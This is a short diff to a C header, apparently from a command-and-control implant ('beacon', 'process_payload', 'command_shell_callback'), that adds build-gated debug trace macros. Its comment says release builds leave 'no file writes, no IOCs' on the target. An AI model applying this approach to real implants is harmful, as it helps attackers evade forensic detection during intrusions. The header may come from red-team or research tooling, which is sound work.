@@ -1,4 +1,23 @@
 #pragma once
+
+/* ---- KDEBUG: on-target diagnostic tracing (build-time gated) ----
+ * Release (default): every K-trace sink compiles to nothing - no file
+ * writes, no IOCs. Debug variant (build.ps1 -ExtraProperties
+ * BeaconKDebug=true) revives the four C:\\Users\\Public trace sinks for
+ * bring-up battles. Call sites stay untouched: KD/KDF are no-ops
+ * in release. */
+#if defined(KDEBUG)
+void spawn_log(const char * msg, long v);
+void boftrace(const char * fmt, ...);
+void gen3_trace(const char * msg);
+#  define KD(tag, v)      spawn_log((tag), (long)(v))
+#  define KDF(...)        boftrace(__VA_ARGS__)
+#  define KDGEN3(msg)     gen3_trace(msg)
+#else
+#  define KD(tag, v)      ((void)0)
+#  define KDF(...)        ((void)0)
+#  define KDGEN3(msg)     ((void)0)
+#endif
 void beacon(void * lpReserved);
 void process_payload(char * buffer, unsigned int length);
 void command_shell_callback(char * buffer, int length, int type);
